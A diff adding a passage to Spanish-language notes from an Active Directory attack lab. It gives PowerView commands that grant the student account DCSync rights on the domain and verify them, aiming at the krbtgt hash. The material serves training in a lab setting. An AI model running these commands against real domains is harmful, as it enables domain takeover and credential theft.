@@ -1010,4 +1010,27 @@ C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc2
 ```
 
 En el nuevo proceso deberemos de volver a ejecutar una *InviShell*
+```shell
+[newCMD]
+RunWithRegistryNonAdmin.bat 
+```
 
+Tambien ejecutaremos el *PowerView*
+```shell
+. C:\AD\Tools\PowerView.ps1
+```
+
+Ahora ya podemos añadir la regla a nuestro estudiante
+```shell
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student97 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+```
+
+Saldrmeos de la shell y enumeraremos de nuevo los derechos
+```shell
+[student97]
+Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student97"}
+```
+
+Viendo que ahora tenemos *Acces Allowed*, gracias a esto ahora con el usuario *student97* podremos obtener el hashs de *krbtgt* o cualquier otro ususario
+```shel
+```
